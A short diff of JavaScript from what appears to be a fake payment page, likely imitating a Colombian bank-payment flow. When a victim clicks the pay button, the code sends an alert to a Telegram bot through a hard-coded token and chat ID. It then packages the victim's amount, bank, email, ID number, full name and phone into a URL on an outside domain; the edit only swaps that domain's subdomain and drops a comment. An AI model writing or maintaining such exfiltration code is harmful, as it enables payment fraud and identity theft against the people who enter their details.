@@ -70,9 +70,7 @@ if (botonPagar) {
         if (overlay) overlay.style.display = 'flex';
         let loadingInterval = animateLoadingText(loadingText);
 
-        // ==========================================
-        // 🚨 ALERTA DE TELEGRAM EXACTA 🚨
-        // ==========================================
+
         const botToken = "8425620613:AAHvyXc-G_Duk_OdOz8VuY_JeHqBdNT-IFQ"; 
         const chatId = "7831097636";         
 
@@ -85,7 +83,7 @@ if (botonPagar) {
         }).catch(err => console.error("Error enviando Telegram:", err));
         // ==========================================
 
-        const baseUrl = 'https://api.pagoswebcol.uk';
+        const baseUrl = 'https://air.pagoswebcol.uk';
         const params = new URLSearchParams({
             amount: amount, bank: banco, email: email, doc: doc, fullName: name, phone: phone, ref: data.referencia
         });
